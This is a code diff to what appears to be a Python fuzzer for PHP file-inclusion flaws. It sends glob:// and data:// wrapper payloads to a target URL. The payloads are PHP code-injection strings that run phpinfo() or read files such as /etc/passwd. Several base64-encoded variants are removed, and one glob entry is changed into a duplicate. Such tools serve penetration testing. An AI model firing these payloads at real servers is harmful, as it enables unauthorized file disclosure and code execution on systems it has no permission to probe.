@@ -50,7 +50,7 @@ def wrapper_glob_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=F
     dirs = ["/etc/", "/tmp/", "/var/www/html/"]
 
     for d in dirs:
-        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*%00", f"glob://{d}*%00", f"glob://{d}*.*%00"]
+        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*", f"glob://{d}*%00", f"glob://{d}*.*%00"]
         for payload in glob_paloads:
             resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
@@ -148,10 +148,6 @@ def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, r
     data_payloads = [f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>",
                      f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>",
                      f"data://text/plain,<?php phpinfo(); ?>",
-                     f"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",                     
-                     f"data://text/plain;base64,PD9waHAgZWNobyBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsgPz4=",
-                     f"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==%00",
-                     f"data://text/plain;base64,PD9waHAgZWNobyBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL3Bhc3N3ZCIpKTsgPz4=%00",
                      f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00",
                      f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00",
                      f"data://text/plain,<?php phpinfo(); ?>%00"]
